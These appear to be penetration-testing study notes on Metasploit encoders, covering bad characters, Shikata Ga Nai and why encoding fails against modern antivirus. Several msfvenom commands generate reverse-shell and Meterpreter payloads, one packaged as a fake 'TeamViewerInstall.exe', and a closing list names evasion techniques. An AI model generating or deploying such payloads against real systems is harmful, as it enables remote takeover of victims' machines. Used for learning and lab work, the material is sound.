
## What Are Encoders in Metasploit

Encoders are modules used to **transform payload shellcode** so it can:

1. Run correctly on different CPU architectures
2. Avoid bad characters that would break exploitation
3. Slightly modify payload structure to evade basic signature detection

Encoders **do not change what the payload does**.
They only change **how the payload looks** at the byte level.

---

## Supported Architectures

Encoders exist for multiple processor architectures, including:

* x86
* x64
* sparc
* ppc
* mips

Payloads must match:

* Target OS
* CPU architecture
* Exploit constraints

---

## Why Encoders Were Important Historically

Encoders were heavily used to:

* Remove **bad characters** (e.g. `\x00`, `\x0a`, `\x0d`)
* Bypass older **signature-based antivirus**
* Make shellcode compatible with restrictive memory conditions

In early Metasploit versions, encoding was often **mandatory** for payload execution.

---

## Bad Characters Explained

Bad characters are bytes that **break payload execution**, commonly due to:

* String termination (`\x00`)
* Newlines (`\x0a`, `\x0d`)
* Application-specific parsing issues

Encoders rewrite the payload so those bytes never appear.

Example:

```bash
-b "\x00\x0a\x0d"
```

---

## Shikata Ga Nai (SGN)

Shikata Ga Nai was the **most popular encoder** for many years.

### What It Does

* Polymorphic XOR encoder
* Changes payload structure every time
* Uses dynamic XOR keys
* Self-decoding stub included

### Meaning

The Japanese phrase means:

> “It cannot be helped”

This reflected how difficult it once was to detect.

---

## Why SGN Is No Longer Effective for AV Evasion

Modern antivirus engines now use:

* Heuristic detection
* Behavioral analysis
* Memory inspection
* ML-based classification

As a result:

* SGN payloads are **easily detected**
* Multiple iterations barely improve detection rate
* Encoding alone is no longer sufficient

Encoders today are **not a real AV bypass technique**.

---

## Old Metasploit Encoding Workflow (Pre-2015)

Previously, payload generation was split across tools:

* `msfpayload` → payload generation
* `msfencode` → encoding

Example:

```bash
msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | \
msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
```

This approach is now **deprecated**.

---

## Modern Workflow: msfvenom

Today, **msfvenom** handles:

* Payload generation
* Encoding
* Formatting
* Architecture selection

Example without explicit encoding:

```bash
msfvenom -a x86 --platform windows \
-p windows/shell/reverse_tcp \
LHOST=127.0.0.1 LPORT=4444 \
-b "\x00" -f perl
```

Metasploit automatically selects a compatible encoder if needed.

---

## Explicit Encoding with msfvenom

To manually specify an encoder:

```bash
msfvenom -a x86 --platform windows \
-p windows/shell/reverse_tcp \
LHOST=127.0.0.1 LPORT=4444 \
-b "\x00" \
-e x86/shikata_ga_nai \
-f perl
```

---

## Multiple Encoding Iterations

You can encode multiple times using `-i`.

Example:

```bash
-i 10
```

This increases payload size but **does not meaningfully evade AV**.

Result:

* Payload grows larger
* Detection rate remains high
* More obvious to heuristic engines

---

## Encoder Selection in msfconsole

Encoders must match:

* Payload architecture
* Exploit constraints

To view compatible encoders:

```bash
show encoders
```

Metasploit automatically filters incompatible encoders.

---

## Example: x64 Payload Encoders

When using x64 payloads, only x64-compatible encoders appear:

* `x64/xor`
* `x64/xor_dynamic`
* `x64/zutto_dekiru`
* `generic/none`

x86 encoders will **not** appear.

---

## Example: x86 Payload Encoders

x86 payloads support more encoders, including:

* `x86/shikata_ga_nai`
* `x86/alpha_mixed`
* `x86/nonalpha`
* `x86/unicode_upper`
* `x86/context_time`

These exist mainly for **exploit compatibility**, not AV evasion.

---

## Encoding Executables (EXE Payloads)

Example:

```bash
msfvenom -a x86 --platform windows \
-p windows/meterpreter/reverse_tcp \
LHOST=10.10.14.5 LPORT=8080 \
-e x86/shikata_ga_nai \
-f exe -o TeamViewerInstall.exe
```

Even with encoding:

* Most AV engines detect it
* VirusTotal results confirm this

---

## Why Encoding Fails Against Modern AV

Modern detection focuses on:

* PE structure
* Runtime behavior
* Memory allocation patterns
* Network callbacks
* Meterpreter signatures

Encoding only changes **static shellcode**, not behavior.

---

## VirusTotal Testing

Metasploit provides:

```bash
msf-virustotal
```

Requires:

* VirusTotal API key
* Payload file

This is useful for **learning and research**, not stealth.

---

## Key Reality Check (Very Important)

Encoders today are used for:

* Removing bad characters
* Payload compatibility
* Lab environments
* Educational understanding

They are **not**:

* Reliable AV bypass methods
* Stealth mechanisms
* Professional evasion techniques

---

## Exam and Lab Takeaways

* Encoding ≠ AV evasion
* SGN is outdated
* Use encoders for compatibility, not stealth
* msfvenom replaces msfpayload + msfencode
* Architecture matching is mandatory
* Multiple iterations rarely help

---

## What Actually Works for Evasion (High Level)

Outside this module, real-world evasion relies on:

* Custom loaders
* In-memory execution
* Living-off-the-land binaries
* Obfuscated PowerShell
* Manual payload delivery
* Post-exploitation tradecraft

---

